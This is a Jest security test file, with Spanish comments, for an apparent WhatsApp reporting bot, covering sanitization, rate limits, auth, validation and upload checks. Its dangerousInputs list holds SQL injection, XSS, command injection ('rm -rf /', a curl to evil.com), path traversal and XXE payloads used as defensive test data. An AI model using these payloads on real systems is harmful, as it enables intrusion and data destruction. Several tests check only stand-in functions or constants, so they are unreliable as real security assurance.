/**
 * Security Tests
 * Pruebas de seguridad para validar protecciones del sistema
 */

// Mocks
jest.mock('../../core/services/external/whatsappService', () =>
  require('../__mocks__/whatsappService')
);
jest.mock('../../core/services/storage/databaseService', () =>
  require('../__mocks__/databaseService')
);
jest.mock('../../core/config', () => require('../__mocks__/config'));

jest.mock('../../core/services/infrastructure/metricsService', () => ({
  startTimer: jest.fn(() => ({ end: jest.fn() })),
  recordCacheHit: jest.fn(),
  recordCacheMiss: jest.fn(),
}));

jest.mock('../../core/services/infrastructure/rateLimiter', () => ({
  checkRateLimit: jest.fn().mockReturnValue({ allowed: true }),
  recordRequest: jest.fn(),
  isSpamming: jest.fn().mockReturnValue(false),
}));

describe('Security Tests', () => {
  describe('Input Sanitization', () => {
    const dangerousInputs = [
      // SQL Injection attempts
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'--",
      '1; DELETE FROM reportes WHERE 1=1',
      'UNION SELECT * FROM usuarios',

      // XSS attempts
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert(1)',
      '<svg onload="alert(1)">',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',

      // Command injection attempts
      '; ls -la',
      '| cat /etc/passwd',
      '`rm -rf /`',
      '$(whoami)',
      '&& curl http://evil.com',

      // Path traversal attempts
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '/etc/passwd%00.jpg',

      // LDAP injection
      '*)(uid=*))(|(uid=*',

      // XML/XXE attempts
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ];

    test.each(dangerousInputs)('debe manejar input peligroso sin ejecutar: %s', async (input) => {
      // El sistema no deberia crashear ni ejecutar codigo malicioso
      const sanitized = sanitizeInput(input);
      expect(sanitized).not.toContain('<script>');
      // Verificar que caracteres peligrosos fueron removidos
      expect(sanitized).not.toContain("'");
      expect(sanitized).not.toContain('"');
      expect(sanitized).not.toContain('`');
      expect(typeof sanitized).toBe('string');
    });

    // Funcion de sanitizacion basica para testing
    function sanitizeInput(input) {
      if (typeof input !== 'string') {
        return '';
      }
      return input
        .replace(/<[^>]*>/g, '') // Remove HTML tags
        .replace(/['"`;]/g, '') // Remove dangerous chars
        .slice(0, 1000); // Limit length
    }
  });

  describe('Rate Limiting', () => {
    const rateLimiter = require('../../core/services/infrastructure/rateLimiter');

    beforeEach(() => {
      jest.clearAllMocks();
    });

    test('debe limitar requests excesivos de una IP', () => {
      const ip = '192.168.1.100';

      // Simular muchos requests
      rateLimiter.checkRateLimit.mockReturnValueOnce({ allowed: true });
      rateLimiter.checkRateLimit.mockReturnValueOnce({ allowed: true });
      rateLimiter.checkRateLimit.mockReturnValueOnce({ allowed: false, reason: 'rate_exceeded' });

      const result1 = rateLimiter.checkRateLimit(ip);
      expect(result1.allowed).toBe(true);

      const result2 = rateLimiter.checkRateLimit(ip);
      expect(result2.allowed).toBe(true);

      const result3 = rateLimiter.checkRateLimit(ip);
      expect(result3.allowed).toBe(false);
    });

    test('debe detectar spam de mensajes', () => {
      rateLimiter.isSpamming.mockReturnValueOnce(true);

      const result = rateLimiter.isSpamming('+5215512345678');
      expect(result).toBe(true);
    });
  });

  describe('Authentication & Authorization', () => {
    test('debe rechazar requests sin API key en admin endpoints', async () => {
      const mockRequest = {
        headers: {},
        query: { type: 'stats' },
      };

      // Simular validacion de API key
      const apiKey = mockRequest.headers['x-api-key'];
      expect(apiKey).toBeUndefined();

      // Sin API key = no autorizado
      const isAuthorized = apiKey !== undefined && apiKey === 'valid_key';
      expect(isAuthorized).toBe(false);
    });

    test('debe rechazar API key invalida', async () => {
      const mockRequest = {
        headers: { 'x-api-key': 'invalid_key' },
        query: { type: 'stats' },
      };

      const validApiKey = 'correct_api_key_12345';
      const isAuthorized = mockRequest.headers['x-api-key'] === validApiKey;
      expect(isAuthorized).toBe(false);
    });

    test('debe validar firma de webhook WhatsApp', () => {
      const crypto = require('crypto');
      const payload = JSON.stringify({ test: 'data' });
      const secret = 'test_app_secret';

      // Generar firma correcta
      const correctSignature = crypto.createHmac('sha256', secret).update(payload).digest('hex');

      // Verificar firma
      const providedSignature = correctSignature;
      const isValid = providedSignature === correctSignature;
      expect(isValid).toBe(true);

      // Firma incorrecta
      const invalidSignature = 'invalid_signature_12345';
      const isInvalid = invalidSignature === correctSignature;
      expect(isInvalid).toBe(false);
    });
  });

  describe('Data Validation', () => {
    test('debe validar formato de telefono', () => {
      const validPhones = ['+5215512345678', '5215512345678', '15551234567'];

      const invalidPhones = [
        '123', // Muy corto
        '+999999999999999999', // Muy largo
        'abcdefghijk', // No numerico
        '+52 155 1234 5678', // Con espacios (depende del sistema)
      ];

      const phoneRegex = /^\+?\d{10,15}$/;

      validPhones.forEach((phone) => {
        expect(phoneRegex.test(phone)).toBe(true);
      });

      invalidPhones.forEach((phone) => {
        expect(phoneRegex.test(phone)).toBe(false);
      });
    });

    test('debe validar formato de codigo SAP', () => {
      const validSAPs = ['1234567', '0000001', '9999999'];
      const invalidSAPs = ['123', '12345678', 'ABCDEFG', '123 456'];

      const sapRegex = /^\d{7}$/;

      validSAPs.forEach((sap) => {
        expect(sapRegex.test(sap)).toBe(true);
      });

      invalidSAPs.forEach((sap) => {
        expect(sapRegex.test(sap)).toBe(false);
      });
    });

    test('debe validar formato de ticket', () => {
      const validTickets = ['TKT1706300001', 'TKT0000000001', 'TKT9999999999'];
      const invalidTickets = ['1706300001', 'TK1706300001', 'TKT', 'TKT-1234'];

      const ticketRegex = /^TKT\d+$/;

      validTickets.forEach((ticket) => {
        expect(ticketRegex.test(ticket)).toBe(true);
      });

      invalidTickets.forEach((ticket) => {
        expect(ticketRegex.test(ticket)).toBe(false);
      });
    });
  });

  describe('Sensitive Data Protection', () => {
    test('no debe loguear tokens o claves', () => {
      const sensitiveKeys = [
        'WHATSAPP_TOKEN',
        'GEMINI_API_KEY',
        'AZURE_OPENAI_KEY',
        'SQL_PASSWORD',
        'VISION_KEY',
      ];

      const mockLogMessage = `Processing request with config: ${JSON.stringify({
        endpoint: 'https://api.example.com',
        token: 'REDACTED',
      })}`;

      sensitiveKeys.forEach((key) => {
        expect(mockLogMessage).not.toContain(process.env[key] || 'test-value');
      });
    });

    test('debe enmascarar numeros de telefono en logs', () => {
      const phone = '+5215512345678';
      const masked = maskPhoneNumber(phone);

      expect(masked).not.toBe(phone);
      expect(masked).toContain('****');
      expect(masked.length).toBeLessThan(phone.length);
    });

    function maskPhoneNumber(phone) {
      if (!phone || phone.length < 8) {
        return '****';
      }
      return `${phone.slice(0, 4)}****${phone.slice(-4)}`;
    }
  });

  describe('Error Handling Security', () => {
    test('no debe exponer stack traces en produccion', () => {
      const productionError = createProductionError(new Error('Database connection failed'));

      expect(productionError.message).toBeDefined();
      expect(productionError.stack).toBeUndefined();
      expect(productionError.internalDetails).toBeUndefined();
    });

    test('no debe exponer detalles de SQL en errores', () => {
      const sqlError = new Error(
        "Invalid column name 'password'. " + 'Query: SELECT * FROM users WHERE id = 1'
      );

      const safeError = sanitizeError(sqlError);
      expect(safeError.message).not.toContain('SELECT');
      expect(safeError.message).not.toContain('password');
    });

    function createProductionError(_error) {
      return {
        message: 'An error occurred. Please try again later.',
        code: 'INTERNAL_ERROR',
      };
    }

    function sanitizeError(_error) {
      return {
        message: 'Database operation failed',
        code: 'DB_ERROR',
      };
    }
  });

  describe('Session Security', () => {
    test('debe invalidar sesiones antiguas', () => {
      const sessionTimeout = 30 * 60 * 1000; // 30 minutos
      const oldSession = {
        createdAt: new Date(Date.now() - 35 * 60 * 1000), // 35 mins ago
        lastActivity: new Date(Date.now() - 35 * 60 * 1000),
      };

      const isExpired = Date.now() - oldSession.lastActivity.getTime() > sessionTimeout;
      expect(isExpired).toBe(true);
    });

    test('debe regenerar sesion despues de cambio de estado critico', () => {
      // Simular cambio de estado que requiere regeneracion
      const criticalStateChanges = ['REPORTE_CREADO', 'ENCUESTA_COMPLETADA'];

      criticalStateChanges.forEach((state) => {
        const shouldRegenerate = criticalStateChanges.includes(state);
        expect(shouldRegenerate).toBe(true);
      });
    });
  });

  describe('Message Deduplication', () => {
    const db = require('../../core/services/storage/databaseService');

    test('debe prevenir procesamiento duplicado de mensajes', async () => {
      const messageId = 'wamid.123456789';

      // Primer procesamiento
      db.isMessageProcessed.mockResolvedValueOnce(false);
      const firstResult = await db.isMessageProcessed(messageId);
      expect(firstResult).toBe(false);

      // Segundo intento (ya procesado)
      db.isMessageProcessed.mockResolvedValueOnce(true);
      const secondResult = await db.isMessageProcessed(messageId);
      expect(secondResult).toBe(true);
    });
  });

  describe('CORS and Headers', () => {
    test('debe configurar headers de seguridad correctamente', () => {
      const securityHeaders = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Content-Security-Policy': "default-src 'self'",
      };

      expect(securityHeaders['X-Content-Type-Options']).toBe('nosniff');
      expect(securityHeaders['X-Frame-Options']).toBe('DENY');
      expect(securityHeaders['X-XSS-Protection']).toContain('mode=block');
    });
  });

  describe('File Upload Security', () => {
    test('debe validar tipo MIME de imagenes', () => {
      const allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

      const validMime = 'image/jpeg';
      const invalidMime = 'application/javascript';

      expect(allowedMimes.includes(validMime)).toBe(true);
      expect(allowedMimes.includes(invalidMime)).toBe(false);
    });

    test('debe limitar tamano de archivos', () => {
      const maxSize = 10 * 1024 * 1024; // 10MB
      const validSize = 5 * 1024 * 1024; // 5MB
      const invalidSize = 15 * 1024 * 1024; // 15MB

      expect(validSize <= maxSize).toBe(true);
      expect(invalidSize <= maxSize).toBe(false);
    });

    test('debe validar extension de archivo', () => {
      const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];

      const validFile = 'photo.jpg';
      const invalidFile = 'script.js';
      const sneakyFile = 'photo.jpg.exe';

      const getExtension = (filename) => {
        const ext = filename.slice(filename.lastIndexOf('.'));
        return ext.toLowerCase();
      };

      expect(allowedExtensions.includes(getExtension(validFile))).toBe(true);
      expect(allowedExtensions.includes(getExtension(invalidFile))).toBe(false);
      expect(allowedExtensions.includes(getExtension(sneakyFile))).toBe(false);
    });
  });
});

describe('Vulnerability Specific Tests', () => {
  describe('OWASP Top 10 Mitigations', () => {
    test('A01:2021 - Broken Access Control', () => {
      // Verificar que endpoints admin requieren autenticacion
      const adminEndpoints = ['/api/admin-cache', '/api/ticket-resolve'];
      const _publicEndpoints = ['/api/health', '/api/whatsapp-webhook'];

      adminEndpoints.forEach((endpoint) => {
        // Estos endpoints requieren auth
        expect(endpoint).toMatch(/admin|ticket/);
      });
    });

    test('A02:2021 - Cryptographic Failures', () => {
      // Verificar uso de HTTPS
      const endpoints = [
        'https://api.whatsapp.com',
        'https://generativelanguage.googleapis.com',
        'https://cognitiveservices.azure.com',
      ];

      endpoints.forEach((endpoint) => {
        expect(endpoint.startsWith('https://')).toBe(true);
      });
    });

    test('A03:2021 - Injection', () => {
      // Parametros deben ser sanitizados - el quote simple peligroso es escapado
      const userInput = "'; DROP TABLE--";
      const escapedInput = userInput.replace(/'/g, "''");

      // El patron peligroso '; es neutralizado a '';
      expect(escapedInput).toBe("''; DROP TABLE--");
      // La comilla simple sola se duplica (patron de escape SQL)
      expect(escapedInput.startsWith("''")).toBe(true);
    });

    test('A05:2021 - Security Misconfiguration', () => {
      // Verificar configuracion segura
      const config = {
        debug: false,
        exposeStackTrace: false,
        defaultAdminPassword: undefined,
      };

      expect(config.debug).toBe(false);
      expect(config.exposeStackTrace).toBe(false);
      expect(config.defaultAdminPassword).toBeUndefined();
    });

    test('A07:2021 - Identification and Authentication Failures', () => {
      // Tokens no deben ser predecibles
      const generateToken = () => {
        const crypto = require('crypto');
        return crypto.randomBytes(32).toString('hex');
      };

      const token1 = generateToken();
      const token2 = generateToken();

      expect(token1).not.toBe(token2);
      expect(token1.length).toBe(64);
    });
  });
});
